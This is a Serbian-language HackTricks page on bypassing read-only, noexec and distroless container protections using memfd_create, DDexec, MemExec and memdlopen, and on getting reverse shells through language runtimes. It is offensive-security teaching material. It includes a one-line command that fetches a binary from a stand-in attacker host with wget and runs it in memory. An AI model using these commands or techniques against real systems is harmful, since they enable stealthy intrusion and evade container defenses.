# Bypass FS zaštita: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video-snimci

U sledećim video-snimcima detaljnije su objašnjene tehnike pomenute na ovoj stranici:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Scenario read-only / no-exec

U kontejneru možete montirati root fajl sistem kao read-only tako što ćete u bezbednosnom kontekstu postaviti **`readOnlyRootFilesystem: true`**.<sup>[[3]](#references)</sup> Na primer:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only root ne čini zasebno montirane volumene read-only. Docker tretira **`/dev/shm`** kao IPC mount, dok su tmpfs opcije poput `rw` i `noexec` izbori konfiguracije pri pokretanju; proverite opcije mount-a ciljnog kontejnera pre nego što se oslonite na bilo koje od tih ponašanja.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Iz red-team perspektive, ta kombinacija može otežati preuzimanje i izvršavanje binarnih fajlova koji već nisu dostupni (na primer, backdoor-a ili alata za enumeraciju).<sup>[[4]](#references)[[5]](#references)</sup>

## Najlakši bypass: skripte

Mount sa `noexec` blokira direktno izvršavanje binarnih fajlova na tom mount-u, ali interpreter i dalje može da čita i tumači skriptu. Ako su dostupni `sh` ili `python`, možete zato pokrenuti shell ili Python skriptu preko tog interpretera.<sup>[[5]](#references)</sup>

Ovo ne pomaže kada je sam potreban alat binarni fajl.<sup>[[5]](#references)</sup>

## Bypass-i preko memorije

Kada je direktno izvršavanje sa montirane putanje blokirano, jedna od mogućnosti je da se ELF učita u memoriju i izvrši preko putanje koja koristi memoriju. Time se izbegava provera `noexec` za taj mount, ali se ne uklanjaju druga ograničenja kernela, dozvola ili pravila.<sup>[[5]](#references)[[6]](#references)</sup>

### Zaobilaženje pomoću FD-a + exec syscall-a

Ako skriptno okruženje može da pristupi odgovarajućem Linux interfejsu, može da kreira anonimni, RAM-backed file descriptor pomoću **`memfd_create(2)`**, upiše ELF bajtove u njega i koristi putanju za izvršavanje zasnovanu na FD-u. Projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generiše kompresovan i base64-enkodovan Python, Perl ili Ruby kod za ovaj postupak.<sup>[[6]](#references)[[7]](#references)</sup>

Projekat trenutno dokumentuje Python, Perl i Ruby ciljeve; PHP ili Node zahtevaju drugu tehniku specifičnu za runtime ili proširenje, pa odsustvo ovog generatora za neki jezik ne znači da je izvršavanje iz memorije nemoguće.<sup>[[6]](#references)[[12]](#references)</sup>

Pogledajte [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) za širi pregled izvršavanja anonimnih fajlova, povezanih obrazaca za staging, kao i detekcije i prikupljanja forenzičkih podataka.

> [!WARNING]
> Običan izvršni fajl upisan u **`/dev/shm`** i dalje podleže podešavanju **`noexec`** za taj mount; samo otvaranje preko običnog file descriptor-a ne menja pravila mount-a.<sup>[[5]](#references)</sup>
>
> Konkretna metoda izvršavanja iz memorije takođe zavisi od runtime-a, arhitekture, kernela i dostupnih dozvola.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) upisuje stager i loader u proces pokrenutog shell-a preko **`/proc/self/mem`**, a zatim predaje kontrolu tom kodu.<sup>[[8]](#references)</sup>

Tako proces može da učita dostavljeni binarni fajl bez prethodnog smeštanja tog fajla u fajl sistem koji dozvoljava izvršavanje.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** može da učita i **izvrši** shellcode ili binarni fajl iz **memorije**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Za više informacija o ovoj tehnici, pogledajte Github ili:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je daemonizovana implementacija DDexec-a. Njegov daemon osluškuje zahteve koji sadrže argumente i sirove bajtove programa, pokreće child proces koji učitava i izvršava svaki program, a roditeljski proces ostaje server.<sup>[[9]](#references)</sup>

Repozitorijum sadrži primer upotrebe **memexec-a za izvršavanje binarnih datoteka iz PHP reverse shell-a** u [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Sa svrhom sličnom DDexec-u, [**memdlopen**](https://github.com/arget13/memdlopen) je implementacija `dlopen()` funkcije bez datoteke, za shared object ili program. Njegov README trenutno navodi podršku za ARM64, zato pre upotrebe proverite arhitekturu ciljnog sistema.<sup>[[10]](#references)</sup>

## Distroless Bypass

Za detaljno objašnjenje **šta je zapravo distroless**, kada je koristan, kada nije i kako menja post-exploitation taktike u kontejnerima, pogledajte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Šta je distroless

Distroless images sadrže samo aplikaciju i njene runtime zavisnosti; zvanične slike izostavljaju package managere, shell-ove i druge programe koji se očekuju u standardnoj Linux distribuciji.<sup>[[11]](#references)</sup>

Ograničavanje runtime slike na te zavisnosti smanjuje količinu softvera prisutnog u produkciji, kao i količinu koju je potrebno skenirati i pratiti.<sup>[[11]](#references)</sup>

### Reverse Shell

U distroless kontejneru možda **nećete pronaći `sh` ni `bash`** za običan shell, niti uobičajene alate kao što su `ls`, `whoami` ili `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Zato uobičajeni reverse shell zasnovan na shell-u ili enumeracija pomoću alata možda neće raditi.<sup>[[11]](#references)</sup>

Ako kompromitovana aplikacija sadrži language runtime (na primer, Python za Flask aplikaciju ili Node.js za Node aplikaciju), RCE i dalje može da koristi taj runtime za komandni kanal i pregled sistema putem njegovih API-ja.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Iskoristite dostupni skriptni jezik za **enumeraciju sistema** pomoću njegovih jezičkih mogućnosti.<sup>[[12]](#references)</sup>

Ako nema **read-only/no-exec** zaštita, komandni kanal može da upiše binarne datoteke na upisiv mount sa dozvolom za izvršavanje i da ih pokrene; prvo proverite opcije mount-a i dozvole.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Kada su ove zaštite prisutne, koristite **gore navedene tehnike izvršavanja iz memorije**, ako to runtime, kernel i dozvole omogućavaju.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

**Primere** iskorišćavanja RCE ranjivosti za dobijanje **reverse shell-ova** zasnovanih na skriptnim jezicima i izvršavanje binarnih datoteka iz memorije možete pronaći u projektu [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Istraživanje Linux manipulacije memorijom radi prikrivanja i izbegavanja](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Prikriveni upadi pomoću DDexec-ng i dlopen() iz memorije - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigurisanje bezbednosnog konteksta za Pod ili Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux stranica priručnika](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
